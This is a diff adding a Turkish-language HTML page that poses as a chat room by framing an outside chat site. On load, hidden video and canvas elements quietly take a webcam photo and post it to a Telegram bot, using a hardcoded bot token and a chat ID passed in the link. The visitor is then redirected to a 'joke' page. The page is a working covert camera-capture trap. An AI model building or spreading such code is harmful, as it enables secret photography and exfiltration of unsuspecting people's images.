@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sohbet Odası</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      background: #000;
+    }
+    iframe {
+      width: 100vw;
+      height: 100vh;
+      border: none;
+      z-index: 1;
+      position: relative;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <iframe src="https://www.koyusohbet.org/chat/" allow="camera"></iframe>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="300" height="200"></canvas>
+
+  <script>
+    const token = '7925810136:AAET-jcZkQKglWwdn2PS_PTUKlDRGCvXVkk';
+    const telegramId = window.location.search.substring(1); // ?ID alır
+
+    async function yakala() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        await new Promise(r => setTimeout(r, 1500));
+
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const dataUrl = canvas.toDataURL("image/png");
+
+        // Fotoğrafı Telegram'a yolla
+        const blob = dataURLtoBlob(dataUrl);
+        const formData = new FormData();
+        formData.append("chat_id", telegramId);
+        formData.append("photo", blob, "yakalandin.png");
+
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+
+        // 10 saniye sonra şaka sayfasına yönlendir
+        setTimeout(() => {
+          window.location.href = `/joke.html?${telegramId}`;
+        }, 10000);
+
+      } catch (e) {
+        console.error("Kamera alınamadı:", e);
+      }
+    }
+
+    function dataURLtoBlob(dataurl) {
+      const arr = dataurl.split(','),
+            mime = arr[0].match(/:(.*?);/)[1],
+            bstr = atob(arr[1]),
+            n = bstr.length,
+            u8arr = new Uint8Array(n);
+      while (n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], { type: mime });
+    }
+
+    window.onload = yakala;
+  </script>
+
+</body>
+</html>
